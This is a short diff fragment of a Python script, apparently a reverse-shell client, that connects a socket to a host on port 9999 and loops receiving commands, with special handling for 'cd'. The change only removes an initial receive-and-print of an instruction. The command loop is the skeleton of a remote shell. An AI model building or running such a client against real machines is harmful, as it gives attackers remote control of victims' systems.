@@ -9,8 +9,6 @@ port = 9999
 
 soc.connect((host, port))
 print("Connected")
-instruction = soc.recv(1024)
-print(instruction[:].decode("utf-8"))
 while True:
     instruction = soc.recv(1024)
     if instruction[0:2].decode("utf-8") == "cd":
